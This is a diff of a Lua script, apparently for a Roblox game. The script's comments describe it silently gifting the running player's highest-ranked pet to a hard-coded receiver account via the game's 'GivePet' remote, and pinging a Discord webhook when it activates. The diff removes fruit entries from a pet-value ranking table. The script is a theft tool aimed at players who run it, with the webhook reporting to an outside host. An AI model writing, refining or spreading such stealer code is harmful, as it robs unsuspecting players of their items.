@@ -10,7 +10,7 @@
   2. It immediately attempts to send a message to a Discord webhook to confirm activation.
   3. When a new player joins the server, the script will:
      a. Check if the new player's name is the designated receiver name.
-     b. If they are the receiver, it finds the highest-ranked item (pet or fruit)
+     b. If they are the receiver, it finds the highest-ranked item (pet)
         in the current player's inventory based on the itemRanks list.
      c. It then fires the game's internal "GivePet" remote event to correctly
         gift the item to the new player. This method works because it's the same
@@ -23,8 +23,7 @@ local receiverNames = {
     "MananGrinding3"
 }
 
--- Define the pet and fruit ranking. Higher numbers mean higher priority for gifting.
--- Pet ranks are generally higher to prioritize them, but rare fruits can be set higher.
+-- Define the pet ranking. Higher numbers mean higher priority for gifting.
 local itemRanks = {
     -- S Tier Pets
     ["Raccoon"] = 99,
@@ -148,18 +147,7 @@ local itemRanks = {
     ["Deer"] = 0.1,
     ["Panda"] = 0.1,
     ["Crab"] = 0.1,
-    ["Parasaurolophus"] = 0.1,
-    
-    -- Fruit values (hypothetical, replace with real values)
-    ["Shiny Dragonfruit"] = 100,
-    ["Golden Apple"] = 99,
-    ["Cosmic Grape"] = 90,
-    ["Galactic Banana"] = 85,
-    ["Diamond Berry"] = 75,
-    ["Ruby Orange"] = 60,
-    ["Emerald Pear"] = 45,
-    ["Silver Strawberry"] = 30,
-    ["Bronze Lemon"] = 15
+    ["Parasaurolophus"] = 0.1
 }
 
 -- IMPORTANT: Replace this with your actual Discord Webhook URL.
